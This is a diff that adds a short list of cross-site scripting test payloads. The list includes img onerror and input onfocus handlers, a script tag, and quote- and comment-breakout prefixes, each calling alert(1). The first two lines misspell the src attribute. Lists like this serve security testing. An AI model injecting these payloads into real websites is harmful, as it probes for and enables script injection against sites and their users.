@@ -1,0 +1,8 @@
+<img onerror='alert(1)' scr='x'/>
+--></pre><img onerror='alert(1)' scr='x'/>
+"/><input onfocus='alert(1)' autofocus/>
+"/><img onerror='alert(1)' src='x'/>
+'/><img onerror='alert(1)' src='x'/>
+'/><input onfocus='alert(1)' autofocus/>
+<img onerror='alert(1)' src='x'/>
+<script>alert(1)</script>
